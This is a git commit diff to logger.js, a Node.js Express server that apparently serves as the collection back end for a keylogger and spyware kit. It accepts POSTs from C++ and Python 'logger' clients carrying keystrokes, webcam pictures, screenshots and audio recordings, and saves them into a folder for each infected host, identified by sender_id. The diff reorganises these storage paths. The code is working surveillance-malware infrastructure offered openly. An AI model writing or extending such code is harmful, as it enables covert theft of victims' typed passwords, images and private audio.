14c3081c343e8b2648643a444e0cc336db7f2357
adampolczynski <adam_polczynski@yahoo.com>
2017-09-09 15:28:58 +0200

    deleted personal info

--- logger.js
+++ logger.js
@@ -2,7 +2,9 @@ var bodyParser = require('body-parser');
 var fs = require('fs');
 let time = require('date-and-time');
 
+var INDEX = 0;
 var CPP_LOG_DIR = "./loggerserver/winhttplogger"; // log dir for C++ logger
+var PYTHON_LOG_DIR = "./loggerserver/pythonlogger";
 
 module.exports = function (app) {
     app.post('/winhttp/', function(req, res) { // PART FOR C++ SIMPLELOGGER
@@ -27,6 +29,7 @@ module.exports = function (app) {
 		console.log("Keys data created, written: " +keys);
 	});
 	}
+	res.send("OK ->");
 });
 app.post('/', function(req, res) { // PART FOR PYTHON LOGGER
 	var keys = req.body['keys'];
@@ -34,14 +37,17 @@ app.post('/', function(req, res) { // PART FOR PYTHON LOGGER
 	var camPic = req.body['camPic'];
 	var sound = req.body['audio'];
 	var host_id = req.body['sender_id'];
-	var dir = host_id+"";
-	if (!fs.existsSync(dir)){
-		fs.mkdirSync(dir);
+	var dir = PYTHON_LOG_DIR+"/"+host_id+"";
+	if (!fs.existsSync(PYTHON_LOG_DIR)){
+		fs.mkdirSync(PYTHON_LOG_DIR);
+		if (!fs.existsSync(dir)){
+			fs.mkdirSync(dir);
+		}
 	}
 	var camImg = Buffer.from(camPic, 'base64');
 	var ssImg = Buffer.from(screenshot, 'base64'); 
 	var rec = Buffer.from(sound, 'base64'); 
-	fs.writeFile(host_id+"/"+"cam_img_"+INDEX+".png", camImg, "binary",function(err) {
+	fs.writeFile(dir+"/"+"cam_img_"+INDEX+".png", camImg, "binary",function(err) {
 		if (err) {
 			console.log(err);
 		} else {
@@ -49,31 +55,31 @@ app.post('/', function(req, res) { // PART FOR PYTHON LOGGER
 			console.log("Webcam pic saved.");
 		}
 	});
-	fs.writeFile(host_id+"/"+"ss_img"+INDEX+".png", ssImg, "binary",function(err) {
+	fs.writeFile(dir+"/"+"ss_img"+INDEX+".png", ssImg, "binary",function(err) {
 		if (err) {
 			console.log(err);
 		} else {
 			console.log("Screenshot saved.");
 		}
 	});
-	fs.writeFile(host_id+"/"+"rec_"+INDEX+".wav", rec, "binary",function(err) {
+	fs.writeFile(dir+"/"+"rec_"+INDEX+".wav", rec, "binary",function(err) {
 		if (err) {
 			console.log(err);
 		} else {
 			console.log("Recording saved.");
 		}
 	});
-	if (fs.existsSync(host_id+"/data")) {
+	if (fs.existsSync(dir+"/data")) {
 		let now = new Date();
 		var date = '\r\n'+time.format(now, 'YYYY/MM/DD HH:mm:ss')+"\r\n";
-	    fs.appendFile(host_id+"/data", keys+date+"\r\n", (err) => {
+	    fs.appendFile(dir+"/data", keys+date+"\r\n", (err) => {
 		  if (err) throw err;
 		  console.log("Appended to file: " + keys);
 	  });
     } else {
 		let now = new Date();
 		var date = '\r\n'+time.format(now, 'YYYY/MM/DD HH:mm:ss')+"\r\n";
-	    fs.writeFile(host_id+"/data", keys+date+"\r\n", function(err) {
+	    fs.writeFile(dir+"/data", keys+date+"\r\n", function(err) {
 	    if (err) {
 		    return console.log(err);
 	    }
